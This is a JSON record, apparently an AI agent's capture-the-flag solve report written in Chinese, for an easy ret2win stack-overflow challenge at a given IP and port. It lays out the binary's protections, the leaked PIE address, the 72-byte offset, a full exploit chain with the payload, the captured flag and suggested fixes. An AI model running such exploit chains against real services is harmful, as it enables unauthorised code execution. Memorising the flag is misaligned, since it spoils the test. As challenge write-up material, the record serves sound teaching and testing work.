@@ -1,0 +1,19 @@
+{
+  "name": "ret2win",
+  "difficulty": "简单",
+  "vuln_type": "Pwn / 栈溢出 ret2win（PIE 泄露 + 栈对齐）",
+  "target": "219.216.64.241:39546（附件：attachments/pwn + libc.so.6 + ld-linux）",
+  "elapsed": "0 日 0 时 1 分 10 秒",
+  "llm": "deepseek-flash",
+  "flag": "nex{Re72win_ko3ko111}",
+  "scope": "仅用户给定的 219.216.64.241:39546；只建立少量连接发 exploit 输入，未扫描/爆破",
+  "fingerprint": "ELF64 amd64；PIE + NX + Full RELRO，无 canary，未 strip；符号 win@0x1169、main@0x117f；启动即打印 `gift: %p`（泄露 win 运行时地址）；win 内 `lea 0x2004 \"cat ./flag\"` -> call 0x1030（system@plt）",
+  "surface": "远程 TCP 交互式程序：main 里 read/gets 读入栈缓冲区，无长度校验 -> 覆盖返回地址；同时 gift 泄露 PIE 基址",
+  "location": "main 栈缓冲区溢出（偏移 72 到 saved RIP）",
+  "evidence": "evidence/step1_*、step2_*（两次连接 ASLR 不同：0x5592a235d169 / 0x55a7d2e98169，payload 各 88 字节，回显同一 flag）；静态：strings 0x2004=cat ./flag、win 字节 554889e5...e8b4feffff 解出 call system@plt",
+  "false_positive": "两次不同 gift 泄露分别计算 base/ret 均打通，排除固定地址/硬编码；payload 长度 88 = 72 填充 + 8 ret 对齐 + 8 win，回显 flag 与 regex 一致（nex{...}）；未加 ret 对齐会崩在 system 的 movaps（本机无法跑 ELF，靠对齐位存在性 + 成功回显判断）",
+  "chain": "connect 219.216.64.241:39546\nrecv -> \"gift: 0x55e433b5e169\"\nwin  = gift\nbase = win - 0x1169\nret  = base + 0x101A        # 一条 ret，修 system 的 16 字节栈对齐\npayload = b\"A\"*72 + p64(ret) + p64(win)\nsendline -> 程序 read 溢出 -> ret 到 win -> system(\"cat ./flag\")\nrecv -> nex{Re72win_ko3ko111}",
+  "impact": "远程栈溢出到 win()，直接执行 cat ./flag 读 flag；若赢函数换成 system(\"/bin/sh\") 即为完整 RCE",
+  "fix": "用 fgets/read 限制长度并校验返回值；开启 -fstack-protector-all（canary）；保留 PIE/NX/Full RELRO；不要打印内部函数地址（去掉 gift 泄露）",
+  "retro": "PIE 靠 gift 泄露算基址；72 偏移 + 一条 ret 对齐即打通，与手搓 p1.py 完全一致（只换端口）。"
+}
